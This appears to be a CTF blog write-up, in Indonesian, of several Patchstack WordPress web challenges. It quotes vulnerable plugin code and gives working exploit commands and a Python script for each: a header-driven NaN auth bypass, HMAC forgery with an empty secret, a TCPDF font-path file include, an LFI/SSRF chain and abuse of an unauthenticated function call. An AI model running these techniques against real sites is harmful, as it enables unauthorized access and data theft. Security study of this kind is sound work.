@@ -1,0 +1,1501 @@
+---
+layout: post
+title: "PatchstackCTF End of Year - Web"
+date: 2025-12-21
+image: /assets/.
+achievement: "3rd"
+categories: ["Patchstack"]
+tags: [web, sqli, ssti, lfi, ctf2025]
+excerpt: "This writeup win for the best writeup."
+---
+
+## AI BadBots
+
+Target: `http://18.130.76.27:9188/`
+
+### Intro
+
+Jadi target “menginstal plugin AI Trust Score” supaya bot berhenti spam… tapi “AI”-nya bisa dipaksa untuk *percaya* request palsu.
+
+Dan lucunya, ini bukan karena model AI, prompt injection, atau apa pun—ini murni **matematika + NaN**. Satu request, langsung “lolos verifikasi” dan membocorkan `BB_SUCCESS`.
+
+---
+
+### Recon: cari titik masuk
+
+Dari attachment yang diberikan, saya mulai dengan unzip lalu mencari file plugin:
+
+```bash
+$ ls -la
+attachment.zip
+
+$ unzip attachment.zip
+```
+
+File yang paling jelas “berbau logika challenge” adalah ini:
+
+- `server-given/challenge-custom/ai-badbots/ai-badbots.php`
+
+Aku buka, baca, dan langsung nemu trigger yang sangat enak untuk penyerang: cuma query string.
+
+```php
+public function evaluate_request()
+{
+    if (!isset($_GET['ai-trust-check'])) {
+        return;
+    }
+
+    $this->collect_signals();
+    $this->calculate_score();
+    $this->validate_score();
+}
+```
+
+Artinya: siapa pun di internet bisa mengakses path “alat test” lewat:
+
+```bash
+curl -i 'http://18.130.76.27:9188/?ai-trust-check=1'
+```
+
+Dan secara default ditolak (403). Sejauh ini, masuk akal.
+
+---
+
+### Read the Code: “AI”-nya cuma angka
+
+Bagian pengumpulan sinyal punya beberapa sinyal (panjang User-Agent, jumlah header, cookies, kompleksitas path, timing). Yang paling menarik adalah “proxy-aware entropy signal” ini:
+
+```php
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+...
+$xff = 0;
+$headers = [
+    'HTTP_CF_CONNECTING_IP',
+    'HTTP_X_FORWARDED_FOR',
+    'HTTP_X_REAL_IP',
+    'HTTP_X_CLIENT_IP',
+    'HTTP_CLIENT_IP',
+    'HTTP_X_CLUSTER_CLIENT_IP',
+];
+foreach ($headers as $header) {
+    if (array_key_exists($header, $_SERVER)) {
+        $xff = $_SERVER[$header];
+    }
+}
+$this->signals['ip_entropy'] = strlen($ip) - strlen($xff);
+```
+
+Kalau `X-Forwarded-For` (atau header proxy lainnya) lebih panjang daripada IP asli (`REMOTE_ADDR`), maka:
+
+- `ip_entropy = strlen(ip) - strlen(xff)` menjadi **negatif**.
+
+Lalu masuk ke normalisasi:
+
+```php
+private function normalize($value)
+{
+    if (!is_numeric($value)) {
+        return 0;
+    }
+    if ($value == 0) {
+        $value = 1;
+    }
+    return log($value) / log(10);
+}
+```
+
+Tidak ada guard untuk nilai `< 0`. Jadi kalau `$value` negatif:
+
+- `log(negative)` ⇒ **NaN**
+
+Biasanya NaN itu “racun” yang bikin validasi gagal. Tapi plot twist-nya ada tepat di validasi ini:
+
+```php
+private function validate_score()
+{
+    if (($this->score * 0) != 0 || $this->score > 0.95) {
+        $this->grant_access();
+        return;
+    }
+    $this->deny_access();
+}
+```
+
+Maksud komentarnya adalah “fail-closed”: skor anomali seharusnya tidak boleh lolos. Tapi implementasinya kebalik:
+
+#### Why does NaN become “PASS”?
+
+Logikanya kira-kira:
+
+```text
+score = average(log10(signals...))
+
+if (score * 0) != 0:
+    # ini TRUE saat score = NaN (karena NaN != 0)
+    GRANT
+else if score > 0.95:
+    GRANT
+else:
+    DENY
+```
+
+Di PHP, `NAN != 0` dievaluasi menjadi `true`. Jadi begitu kita berhasil bikin `score` menjadi NaN, kondisi kiri langsung membuka pintu.
+
+---
+
+### Exploit: buat `ip_entropy` negatif pakai header panjang
+
+Tujuannya sederhana:
+
+1. Bikin `ip_entropy = strlen(ip) - strlen(xff)` negatif
+2. Nilai negatif masuk `log()` ⇒ NaN
+3. NaN mengenai `($score * 0) != 0` ⇒ grant_access
+
+PoC:
+
+```bash
+curl -i -s \
+  'http://18.130.76.27:9188/?ai-trust-check=1' \
+  -H 'X-Forwarded-For: 1234567890123456789012345678901234567890'
+HTTP/1.1 200 OK
+Date: Sun, 21 Dec 2025 15:56:01 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.3.28
+Content-Length: 19
+Content-Type: text/plain;charset=UTF-8
+
+"CTF{W0W_1T5_M4TH}"
+```
+
+Hasil: server membalas `200 OK` dan mengembalikan `BB_SUCCESS` (flag).
+
+### Flag
+
+`CTF{W0W_1T5_M4TH}`
+
+---
+
+## Bazaar
+
+Target: `http://18.130.76.27:9100/`
+
+### Intro
+
+Situsnya kelihatan “aman”: landing page rapi, banner “store launching”, dan WooCommerce yang biasanya *battle-tested*. Tapi pas aku lihat isi server (source code) dan bagaimana plugin kustom menangani “payments”, vibe-nya langsung berubah: ini bukan bug kecil—ini *payment bypass* yang ujungnya memberi kita link download produk tanpa perlu jadi user terdaftar.
+
+Di write-up ini saya jelaskan alur dari recon sampai eksploit: kenapa endpoint-nya bisa dipanggil tanpa login, kenapa signature-nya bisa dipalsukan, dan bagaimana itu berujung ke link download yang bocor.
+
+---
+
+### Recon: “tokonya belum buka, tapi backend sudah banyak bicara”
+
+Pertama, lihat websitenya:
+
+```bash
+curl -i http://18.130.76.27:9100/
+```
+
+Jelas WordPress + WooCommerce. Di challenge web, *sweet spot* seringnya `admin-ajax.php`, jadi saya catat endpoint-nya:
+
+```
+/wp-admin/admin-ajax.php
+```
+
+Karena ini whitebox, saya lanjut ke hal yang paling “worth it”: cari plugin kustomnya.
+
+---
+
+### Read the code: ketemu plugin “Bazaar” (dan dua endpoint yang kebuka lebar)
+
+Di source (container) ada plugin:
+
+`server-given/challenge-custom/bazaar/payment-flow.php`
+
+Di dalamnya ada dua hook yang langsung bikin saya melek:
+
+```php
+add_action('wp_ajax_nopriv_bazaar_process_payment', 'bazaar_handle_purchase_submission');
+add_action('wp_ajax_nopriv_get_bazaar_order', 'get_bazaar_order');
+```
+
+`wp_ajax_nopriv_*` artinya: **bisa dipanggil tanpa login**.
+
+Sekarang tinggal: “dia ngapain?”
+
+---
+
+### Part 1 — endpoint “Payment” yang bisa kita *palsukan*
+
+Masih di `payment-flow.php`, fungsi `bazaar_handle_purchase_submission()` mengecek header signature:
+
+```php
+$payload = file_get_contents('php://input');
+$header = getallheaders();
+$sig_header = $header['X-Signature'] ?? '';
+
+$secret = get_option('bazaar_secret');
+
+if (verifyHeader($payload, $sig_header, $secret)) {
+    $charge = bazaar_simulate_charge_from_cart($data);
+}
+```
+
+Verifikasi signature ada di:
+
+`server-given/challenge-custom/bazaar/SignatureVerification.php`
+
+Intinya seperti ini:
+
+```php
+$signedPayload = "{$timestamp}.{$payload}";
+$expectedSignature = hash_hmac('sha256', $signedPayload, $secret);
+```
+
+Masalahnya bukan HMAC-nya (itu aman), tapi **manajemen secret**:
+
+- `bazaar_secret` diambil dari `get_option('bazaar_secret')`
+- di script/tooling deploy challenge, option ini **tidak pernah diset**
+- di PHP, secret kosong/false berujung ke HMAC dengan key kosong (`""`)
+
+Kalau key-nya kosong, kita bisa generate “signature” sendiri.
+
+---
+
+### Part 2 — endpoint “get order” yang membocorkan link download
+
+Sekarang endpoint kedua:
+
+```php
+add_action('wp_ajax_nopriv_get_bazaar_order', 'get_bazaar_order');
+```
+
+`get_bazaar_order()` menerima `order_key`, lalu mengembalikan detail order sebagai JSON. Dan yang paling krusial: kalau produknya bisa didownload, dia juga mengembalikan URL download langsung:
+
+```php
+if ( $product && $product->is_downloadable() ) {
+    foreach ( $product->get_downloads() as $download ) {
+        $downloads[] = [
+            'name' => $download->get_name(),
+            'file' => $download->get_file(), // Direct URL
+        ];
+    }
+}
+```
+
+Jadi rencana mainnya jelas:
+
+1) buat order “completed” lewat endpoint payment (tanpa benar-benar bayar)  
+2) ambil `order_key` dari redirect “order received”  
+3) query `get_bazaar_order` pakai `order_key`  
+4) ambil `downloads[].file` → fetch filenya
+
+---
+
+### Exploit: cart → order → download
+
+#### 1) Cari produk yang menarik
+
+Halaman shop tidak selalu menampilkan daftar produk:
+
+```bash
+curl -s 'http://18.130.76.27:9100/?s=Flaggable-Download' | rg -n 'product/flaggable-download'
+```
+
+Produknya ada di:
+
+```
+/product/flaggable-download/
+```
+
+Dari HTML, WordPress menyertakan `postid-11`, jadi product ID-nya `11`.
+
+#### 2) Tambahkan ke cart (untuk membuat sesi cart)
+
+Pakai cookie jar:
+
+```bash
+curl -s -c cookies.txt 'http://18.130.76.27:9100/?add-to-cart=11' > /dev/null
+```
+
+#### 3) Palsukan signature + “process payment”
+
+Format header yang dipakai `verifyHeader()` kurang lebih:
+
+```
+X-Signature: t=<unix_ts>,v1=<hex_hmac_sha256>
+```
+
+Input HMAC-nya: `"{timestamp}.{raw_body}"`
+
+Karena `bazaar_secret` kosong, key HMAC juga kosong. Saya buat script biar lebih gampang:
+
+```py
+import time, hmac, hashlib, requests, urllib.parse, re
+
+BASE = "http://18.130.76.27:9100"
+s = requests.Session()
+
+# 1) seed cart
+s.get(f"{BASE}/?add-to-cart=11")
+
+# 2) craft body (urlencoded)
+fields = [
+    ("product_id", "11"),
+    ("price", "10"),
+    ("cart_id", "testcart"),
+    ("customer_email", "test@example.com"),
+    ("payment_token", "tok_test"),
+]
+payload = urllib.parse.urlencode(fields)
+
+# 3) forge signature with empty secret
+ts = int(time.time())
+signed = f"{ts}.{payload}".encode()
+sig = hmac.new(b"", signed, hashlib.sha256).hexdigest()
+hdr = {"X-Signature": f"t={ts},v1={sig}", "Content-Type": "application/x-www-form-urlencoded"}
+
+# 4) process payment (get order-received redirect)
+r = s.post(f"{BASE}/wp-admin/admin-ajax.php?action=bazaar_process_payment",
+           data=payload, headers=hdr, allow_redirects=False)
+loc = r.headers["Location"]
+print("[+] redirect:", loc)
+
+# 5) extract order_key from redirect URL
+order_key = re.search(r"[?&]key=([^&]+)", loc).group(1)
+print("[+] order_key:", order_key)
+
+# 6) fetch order JSON (nopriv)
+j = requests.post(f"{BASE}/wp-admin/admin-ajax.php?action=get_bazaar_order",
+                  data={"order_key": order_key}).json()
+file_url = j["data"]["items"][0]["downloads"][0]["file"].replace("\\/", "/")
+print("[+] file_url:", file_url)
+
+# 7) download file
+print("[+] file content:", requests.get(file_url).text.strip())
+```
+
+Saat dijalankan, output terakhir menampilkan isi file yang bisa didownload (flag), karena file `.txt` di uploads dapat diakses publik.
+
+```bash
+$ python3 solve.py                              
+[+] redirect: http://18.130.76.27:9100/checkout/order-received/136/?key=wc_order_WgoLTrPjtZap6
+[+] order_key: wc_order_WgoLTrPjtZap6
+[+] file_url: http://18.130.76.27:9100/wp-content/uploads/bazaar/flag-7a0ae62f24363ffc55e2129632f29d71.txt
+[+] file content: CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}
+```
+
+### Flag
+
+`CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}`
+
+---
+
+## Dark Library
+
+Target: `http://18.130.76.27:9107/`
+
+### Intro
+
+Website ini “menjual database leaks” dengan UI gelap, tombol upload SVG, dan satu janji manis (bukan janji politik): *“SVG files will be processed and previewed as PDF to prevent STORED XSS.”*  
+Saya suka bagian ini—karena biasanya, frase “biar aman” adalah cara halus untuk bilang: *“di balik layar ada converter yang siap dipaksa kerja.”*
+
+---
+
+### Recon: “apa yang bisa kita serang dari UI?”
+
+Buka homepage: fitur paling obvious adalah upload SVG. Biasanya, pipeline “SVG → PDF” itu berisiko:
+
+- SVG itu XML (banyak edge-case parser).
+- PDF generator sering punya fitur seperti “load resource/font/image dari sebuah path”.
+- Dan kalau ada library yang “spesial”, sering ada bug yang “spesial” juga.
+
+Karena ini whitebox, saya langsung cari apa yang memicu konversi dari sisi frontend.
+
+Di theme `dark-library`, file JS-nya jelas:
+
+```js
+// extracted/server-given/challenge-custom/dark-library/shadow-archive.js
+formData.append('action', 'shadow_archive_svg_to_pdf');
+formData.append('svg_content', svgContent);
+formData.append('font_family', ''); // “vulnerable parameter”
+
+fetch(ajaxurl || '/wp-admin/admin-ajax.php', {
+  method: 'POST',
+  body: formData
+})
+```
+
+Jadi endpoint-nya:
+
+- `POST /wp-admin/admin-ajax.php`
+- dengan parameter `action=shadow_archive_svg_to_pdf`
+
+WordPress AJAX action seperti ini sering “terbuka” kalau didaftarkan dengan `wp_ajax_nopriv_*`. Cek sisi server.
+
+---
+
+### Read the code: ketemu handler dengan “niatnya: preview”
+
+Di `functions.php` theme:
+
+```php
+// extracted/server-given/challenge-custom/dark-library/functions.php
+add_action('wp_ajax_shadow_archive_svg_to_pdf', 'shadow_archive_svg_to_pdf');
+add_action('wp_ajax_nopriv_shadow_archive_svg_to_pdf', 'shadow_archive_svg_to_pdf');
+```
+
+Yup: **bisa diakses tanpa login**.
+
+Handler-nya:
+
+```php
+function shadow_archive_svg_to_pdf() {
+  $svg_content = $_POST['svg_content'];
+  $font_family = isset($_POST['font_family']) ? $_POST['font_family'] : '';
+
+  require_once(get_template_directory() . '/assets/libraries/TCPDF/tcpdf.php');
+
+  $pdf = new TCPDF(...);
+  $pdf->AddPage();
+
+  $svgString = "<svg width=\"200\" height=\"200\">";
+  if (!empty($font_family)) {
+    $svgString .= "<text x=\"20\" y=\"20\" font=\"empty\" font-family=\"" . esc_attr($font_family) . "\">test</text>";
+  }
+  $svgString .= $svg_content;
+  $svgString .= "</svg>";
+
+  $pdf->ImageSVG('@' . $svgString, ...);
+  $pdf->Output($filename, 'D');
+}
+```
+
+Dua hal yang langsung bikin saya curiga lagi:
+
+1) `font_family` **tidak divalidasi** di PHP (cuma `esc_attr`, itu *escaping*, bukan *validasi*).  
+2) Mereka sengaja menambah `font="empty"` saat `font_family` tidak kosong. Ini… sangat spesifik.
+
+Saya curiga ini bukan “kecelakaan”, tapi *setup* untuk bug TCPDF tertentu.
+
+---
+
+### Dissecting TCPDF: bug-nya bukan di WordPress—tapi di “library spesial”
+
+Karena ini whitebox, kita masuk ke library `TCPDF` yang ikut di attachment.
+
+Alur level-tingginya:
+
+- `ImageSVG()` mem-parsing SVG sebagai XML.
+- Saat ketemu elemen `<text>`, dia memanggil `setSVGStyles()`.
+- Di situ, TCPDF memilih font dan ujungnya memanggil `setFont(...)`.
+- `setFont()` memanggil `AddFont()`, yang akhirnya melakukan `include($fontfile)` untuk memuat “font definition file”.
+
+Biasanya, nama font “dibersihkan” dulu supaya jadi hanya `helvetica`, `times`, dll. Ada fungsi:
+
+```php
+// extracted/server-given/challenge-custom/dark-library/assets/libraries/TCPDF/tcpdf.php
+public function getFontFamilyName($fontfamily) {
+  $fontfamily = preg_replace('/[^a-z0-9_\,]/', '', strtolower($fontfamily));
+  ...
+}
+```
+
+Kalau jalur ini dipakai, string seperti `/tmp/flag` harusnya jadi `tmpflag` (slash dihapus), jadi kita tidak bisa menunjuk ke file path.
+
+Tapi… ada cabang yang **melewati** sanitizer ini:
+
+```php
+// extracted/.../TCPDF/tcpdf.php (setSVGStyles)
+if (!empty($svgstyle['font'])) {
+  if (preg_match('/font-family.../', $svgstyle['font'], $regs)) {
+    $font_family = $this->getFontFamilyName($regs[1]);
+  } else {
+    $font_family = $svgstyle['font-family']; // <- UNSAFE PATH: no getFontFamilyName()
+  }
+} else {
+  $font_family = $this->getFontFamilyName($svgstyle['font-family']);
+}
+```
+
+Kuncinya: **kalau atribut `font` ada dan tidak kosong**, tapi tidak mengandung pola `font-family: ...`, TCPDF memakai `font-family` mentah tanpa `getFontFamilyName()`.
+
+Dan sekarang baris aneh di theme itu masuk akal:
+
+> `font="empty"`
+
+Mereka sengaja memastikan `svgstyle['font']` tidak kosong (`"empty"`), supaya TCPDF jatuh ke cabang `else` yang berbahaya itu.
+
+---
+
+### Where is the “server secret” stored?
+
+Di Dockerfile challenge:
+
+```dockerfile
+# extracted/server-given/Dockerfile
+RUN echo "<?php printf('CTF{REDACTED}');?>" > /tmp/flag.php && chmod 644 /tmp/flag.php
+```
+
+Flag disimpan sebagai file PHP yang mencetak flag saat di-`include`.
+
+Sekarang kita cuma butuh cara supaya TCPDF melakukan:
+
+```
+include("/tmp/flag.php");
+```
+
+Dan itu terjadi di `AddFont()` ketika dia mencari font definition file:
+
+```php
+// extracted/.../TCPDF/tcpdf.php (AddFont)
+$tmp_fontfile = str_replace(' ', '', $family).strtolower($style).'.php';
+...
+include($fontfile);
+```
+
+Kalau kita bisa set `$family` jadi `/tmp/flag`, maka `$tmp_fontfile` menjadi:
+
+```
+/tmp/flag.php
+```
+
+Boom.
+
+---
+
+### Exploit:
+
+Yang perlu kita lakukan:
+
+- Panggil AJAX action `shadow_archive_svg_to_pdf`
+- Kirim `font_family=/tmp/flag`
+- Kirim SVG apa pun (minimal `<text>` saja cukup)
+
+```bash
+curl -sS -X POST 'http://18.130.76.27:9107/wp-admin/admin-ajax.php' \
+  -d 'action=shadow_archive_svg_to_pdf' \
+  --data-urlencode 'svg_content=<text x="10" y="50">hi</text>' \
+  --data-urlencode 'font_family=/tmp/flag' \
+  -d 'x=15' -d 'y=30' -d 'w=' -d 'h='
+CTF{wh3n_you_g0nna_upd4t3_l1brari3s}<strong>TCPDF ERROR: </strong>The font definition file has a bad format: /tmp/flag.php
+```
+
+Output:
+
+- Flag tercetak dulu (output `printf` dari `/tmp/flag.php`)
+- lalu TCPDF error karena file tersebut bukan “font definition” yang valid
+
+
+### Flag
+
+`CTF{wh3n_you_g0nna_upd4t3_l1brari3s}`
+
+---
+
+## Klunked
+
+Target: `http://18.130.76.27:9147/`
+
+### Intro
+
+Challenge ini dimulai dari kalimat yang terdengar “aman”: *“I like a clean website with high-quality images from trusted sources. What else do you need besides this all‑in‑one plugin?”*
+
+Ternyata jawabannya bukan “CDN”, “cache”, atau “WebP compression” — tapi: **permission check yang benar**, **nonce yang tidak dipublikasikan ke publik**, dan **tidak merender watermark dari file path level OS**.
+
+Di write-up ini saya jelaskan alur dari recon ke exploit chain yang ujungnya “mengubah” `/flag.txt` jadi watermark di sebuah gambar, lalu kita ambil lewat URL publik.
+
+---
+
+### Recon: apa yang terekspos tanpa login?
+
+Pertama saya buka homepage, lalu langsung fokus ke hal yang sering “bocor” di WordPress: konfigurasi JS global.
+
+```bash
+curl -s http://18.130.76.27:9147/ | rg -n "window\\.KLUNK|admin-ajax\\.php"
+```
+
+Di source ada global object seperti ini:
+
+```js
+window.KLUNK = {
+  "ajax_url":"http://18.130.76.27:9147/wp-admin/admin-ajax.php",
+  "knonce_<tag>":"<nonce>"
+};
+```
+
+Ini sudah cukup untuk menyimpulkan dua hal:
+
+1) Ada **endpoint AJAX** yang bisa dipanggil dari luar (`admin-ajax.php`).
+2) Ada **nonce** yang dipublikasikan ke semua pengunjung (guest).
+
+Karena ini challenge whitebox, saya langsung baca plugin-nya.
+
+---
+
+### Read the code: membedah plugin “Klunk”
+
+Plugin kustomnya ada di `server-given/challenge-custom/klunk/`.
+
+#### 1) Nonce dibagikan ke publik
+
+`src/admin/class-script-loader.php` menaruh nonce di `wp_enqueue_scripts` (frontend), artinya **guest juga dapat nonce**:
+
+```php
+wp_add_inline_script(
+  'klunk-frontend',
+  'window.KLUNK = ' . wp_json_encode($data) . ';',
+  'before'
+);
+```
+
+#### 2) Ada AJAX action `nopriv`
+
+`src/admin/class-admin.php` mendaftarkan handler untuk guest juga:
+
+```php
+add_action('wp_ajax_nopriv_klunk_<tag>_upl', [ $this, 'upload_pic_ajax' ]);
+add_action('wp_ajax_nopriv_klunk_<tag>_save_wm_ajax', [ $this, 'save_wm_ajax' ]);
+```
+
+Jadi: selama kita punya nonce, kita bisa:
+
+- upload file `.rawpic` (sebenarnya PNG asli, tapi ekstensi “aneh”)
+- menulis file watermark `.txt` ke folder uploads
+
+#### 3) Permission check REST endpoint “watermark” rusak
+
+Di `src/admin/class-metadata.php` ada `permission_check()`:
+
+```php
+public function permission_check() {
+  if (!wp_get_current_user() && !current_user_can('upload_files') && !current_user_can('edit_posts')) {
+    return false;
+  }
+  return true;
+}
+```
+
+Dua masalah:
+
+- `wp_get_current_user()` di WordPress mengembalikan objek user (bahkan saat belum login), jadi `!wp_get_current_user()` biasanya **false**.
+- Kondisinya pakai `&&`, jadi supaya gagal harus “tidak ada user” **dan** tidak punya capability **dan** tidak punya capability lain. Praktiknya: **permission_callback ini hampir selalu lolos**.
+
+Artinya route `PUT /wp-json/klunk/v1/watermark` bisa dipanggil tanpa login.
+
+#### 4) LFI: watermark bisa “dibaca” dari file path
+
+Masih di `add_watermark()`:
+
+```php
+$string = is_readable($data['watermark'])
+  ? ( ($tmp = @file_get_contents($data['watermark'])) === false ? $data['watermark'] : $tmp )
+  : (string) $data['watermark'];
+```
+
+Kalau kita set `watermark=/flag.txt`, plugin mencoba `file_get_contents('/flag.txt')`, lalu memakai teksnya untuk menggambar watermark.
+
+#### 5) SSRF kecil untuk bypass “DMCA check”
+
+Sebelum menggambar watermark, plugin melakukan “DMCA check”:
+
+```php
+$check_url = $proxy . '?api=' . $api . '&image=' . $image;
+$probe = wp_remote_get($check_url, ['timeout' => 3]);
+...
+if (strpos($body, 'accept') === false) { deny; }
+```
+
+`proxy` dibatasi ke IP internal (loopback/private ranges), tapi **loopback (`127.0.0.1`) secara eksplisit diizinkan**.
+
+Triknya: buat `accept.txt` di uploads (lewat AJAX `save_wm_ajax`), lalu set proxy ke:
+
+```
+127.0.0.1/wp-content/uploads/accept.txt
+```
+
+Saat WordPress GET URL itu, responsnya berisi `accept`, dan check-nya lolos.
+
+---
+
+### Exploit chain: guest → “render /flag.txt jadi PNG”
+
+Rantainya bersih banget:
+
+1) Ambil `<tag>` dan `<nonce>` dari `window.KLUNK` di homepage.
+2) Panggil AJAX `save_wm_ajax` untuk membuat `/wp-content/uploads/accept.txt` berisi `accept`.
+3) Panggil AJAX `upl` untuk upload PNG kecil sebagai `.rawpic` ke `/wp-content/uploads/upl/pic_<id>.rawpic`.
+4) Panggil REST `PUT /wp-json/klunk/v1/watermark` dengan:
+   - `image=/wp-content/uploads/upl/pic_<id>.rawpic`
+   - `watermark=/flag.txt`
+   - `proxy=127.0.0.1/wp-content/uploads/accept.txt`
+5) Ambil output PNG dari `/wp-content/uploads/processed/image_<rand>.png` → baca watermark = flag.
+
+---
+
+### PoC
+
+Ambil nonce dulu:
+
+```bash
+curl -s http://18.130.76.27:9147/ | rg -o '\"knonce_[0-9a-f]{8}\":\"[0-9a-f]+\"'
+```
+
+Contoh hasil:
+
+- `TAG=bd28fa33`
+- `NONCE=d0254be0d2`
+
+1) Buat `accept.txt`:
+
+```bash
+curl -s -X POST 'http://18.130.76.27:9147/wp-admin/admin-ajax.php' \
+  -d "action=klunk_${TAG}_save_wm_ajax" \
+  -d "knonce_${TAG}=${NONCE}" \
+  -d "watermark=accept" \
+  -d "filename=accept.txt"
+```
+
+2) Upload PNG sebagai `.rawpic` (butuh file PNG kecil; mis. `tiny.png`):
+
+```bash
+curl -s -X POST 'http://18.130.76.27:9147/wp-admin/admin-ajax.php' \
+  -F "action=klunk_${TAG}_upl" \
+  -F "knonce_${TAG}=${NONCE}" \
+  -F "file=@tiny.png;filename=x.rawpic;type=image/png"
+```
+
+Responsnya memberikan `file_id`. Lalu panggil endpoint watermark:
+
+```bash
+curl -s -X PUT 'http://18.130.76.27:9147/wp-json/klunk/v1/watermark' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "image": "/wp-content/uploads/upl/pic_<file_id>.rawpic",
+    "watermark": "/flag.txt",
+    "proxy": "127.0.0.1/wp-content/uploads/accept.txt"
+  }'
+```
+
+Output berisi path file hasil proses, misalnya:
+
+```json
+{"success":true,"image_path":"\/var\/www\/html\/wp-content\/uploads\/processed\/image_deadbeef.png"}
+```
+
+Ambil lewat browser/curl:
+
+```bash
+curl -s 'http://18.130.76.27:9147/wp-content/uploads/processed/image_deadbeef.png' -o out.png
+```
+
+Di `out.png`, watermark-nya adalah flag.
+
+---
+
+### Flag
+
+`CTF{KLUNKED_2_EXFILTRATED_0z933}`
+
+---
+
+## Super Malware Scanner
+
+Target: `http://18.130.76.27:9155/`
+
+### Intro
+
+Challenge ini berjudul “Super Malware Scanner”, tapi vibe-nya lebih seperti: *scanner yang diam-diam jadi malware*.
+
+Kita diberi **white-box** (source tersedia), jadi tujuannya bukan brute force, tapi **mengikuti alur kode sampai ketemu “oops” yang realistis**: REST endpoint publik + fitur “deobfuscation” yang terlalu percaya diri, lalu… flag kepanggil sendiri.
+
+---
+
+### Recon: cari permukaan serangan
+
+Langkah paling masuk akal untuk white-box: buka attachment dan cari entry point yang bisa diakses dari luar.
+
+```bash
+unzip -q attachment.zip
+sed -n '1,260p' server-given/challenge-custom/super-malware-scanner.php
+```
+
+Hal pertama yang saya pahami: plugin ini dipasang sebagai **MU-plugin**:
+
+```dockerfile
+# server-given/Dockerfile
+COPY --chown=www-data:www-data challenge-custom/super-malware-scanner.php \
+  /usr/src/wordpress/wp-content/mu-plugins/super-malware-scanner.php
+```
+
+MU-plugin otomatis diload tanpa perlu “diaktifkan” dari admin. Artinya: kalau ada REST route/handler yang terekspos, dia terekspos dari awal.
+
+Di file plugin, saya menemukan REST route ini:
+
+```php
+register_rest_route('sms/v1', '/scan', array(
+  'methods' => 'GET',
+  'callback' => array($this, 'apiScanCode'),
+  'permission_callback' => '__return_true',
+));
+```
+
+`permission_callback` = `__return_true` artinya: **endpoint bisa diakses siapa pun, tanpa login**.
+
+Endpoint kita:  
+`GET /wp-json/sms/v1/scan`
+
+---
+
+### Mengikuti alurnya: dari REST ke “deobfuscate”
+
+`apiScanCode()` menerima parameter:
+
+- `payload` (wajib)
+- `deobfuscate` (opsional)
+
+Lalu memanggil `scanCode($payload, $deobfuscate)`.
+
+Di `scanCode()`, ada gate yang kelihatan bakal penting untuk eksploit:
+
+```php
+if (preg_match('/^[A-Za-z0-9+\/=]+$/', $code) && base64_decode($code, true) !== false) {
+  $code = base64_decode($code);
+} else {
+  return array('success' => false, 'message' => 'no 64e');
+}
+```
+
+Jadi `payload` **harus** terlihat seperti Base64 dan berhasil didecode.
+
+Kalau `deobfuscate` true, dia masuk ke:
+
+```php
+$deobfuscated = $this->deobfuscateCode($code);
+```
+
+Dan di sinilah **drama** dimulai.
+
+---
+
+### Bug utama: “deobfuscator” yang berubah jadi gadget executor
+
+`deobfuscateCode()` punya regex besar untuk “menangkap pola malware yang diobfuscate”, lalu… dia *debug-print* hasil pemrosesan:
+
+```php
+if (preg_match($pattern, $code, $matches)) {
+  print_r($this->processDeltaOrd($code, $matches));
+}
+```
+
+`processDeltaOrd()` memproses “function chain” dari hasil regex, lalu memanggil fungsi-fungsi itu lewat `call_user_func`:
+
+```php
+$function_chain = explode('(', $matches[7]);
+$functions = array_reverse(array_filter($function_chain));
+$data = $payload;
+
+foreach ($functions as $func) {
+  $func = trim($func);
+  if ($this->isFunc($func)) {
+    $data = call_user_func($func, $data);
+  }
+}
+```
+
+Mereka mengklaim aman karena ada allowlist `isFunc()`. Tapi… allowlist itu memasukkan:
+
+```php
+'get_option',
+```
+
+Dan dari Docker toolbox, setup WordPress menambahkan flag sebagai option:
+
+```makefile
+# server-given/docker/wordpress/toolbox/Makefile
+$(WP_CLI) option add flag "CTF{REDACTED}"
+```
+
+Kesimpulan tajamnya:
+
+1. REST endpoint bisa diakses publik.
+2. Kita bisa membuat input yang match regex “obfuscation”.
+3. `processDeltaOrd()` akan mengeksekusi chain fungsi yang di-allowlist.
+4. Karena `get_option` di-allowlist, kita bisa minta `get_option('flag')`.
+5. Hasilnya diprint di output HTTP (sebelum respons JSON).
+
+Ini bukan “RCE klasik”, tapi **pemanggilan fungsi server-side tanpa autentikasi** yang cukup untuk *eksfiltrasi data* (flag).
+
+---
+
+### Exploit: buat payload yang “kelihatan seperti malware”
+
+Kita tidak butuh PHP ini benar-benar dieksekusi sebagai kode. Kita hanya perlu:
+
+- lolos gate Base64
+- match regex `deobfuscateCode()`
+- memasukkan `(...(get_option('flag'))...)` supaya `matches[7]` berisi `get_option`
+
+Payload (string yang akan di-Base64):
+
+```php
+function x($y){
+$z='';
+for($i=0;$i<strlen($y);$i++){
+$y[$i]=chr(ord($y[$i])+0);
+}
+return $y;
+}
+eval(x((get_option('flag'))));
+```
+
+Generate Base64:
+
+```bash
+import base64
+code = """function x($y){
+$z='';
+for($i=0;$i<strlen($y);$i++){
+$y[$i]=chr(ord($y[$i])+0);
+}
+return $y;
+}
+eval(x((get_option('flag'))));
+"""
+print(base64.b64encode(code.encode()).decode())
+
+```
+
+Lalu tembak endpoint-nya (ingat: prefix WordPress REST API = `/wp-json/`):
+
+```bash
+curl -sS --get 'http://18.130.76.27:9155/wp-json/sms/v1/scan' \
+  --data-urlencode 'payload=ZnVuY3Rpb24geCgkeSl7CiR6PScnOwpmb3IoJGk9MDskaTxzdHJsZW4oJHkpOyRpKyspewokeVskaV09Y2hyKG9yZCgkeVskaV0pKzApOwp9CnJldHVybiAkeTsKfQpldmFsKHgoKGdldF9vcHRpb24oJ2ZsYWcnKSkpKTsK' \
+  --data-urlencode 'deobfuscate=1'
+CTF{763345fitalian_mafia354d33ed45df345}{"success":true,"result":{"threats_found":1,"threats":["aha! Suspicious patterns detected"],"clean":false},"message":"Scan completed"}
+```
+
+Output-nya agak unik: flag **tercetak dulu**, baru JSON menyusul.
+
+### Flag
+
+`CTF{763345fitalian_mafia354d33ed45df345}`
+
+---
+
+## Hachimon-Tonkou
+
+Target: `http://18.130.76.27:9120/`
+
+### Intro
+
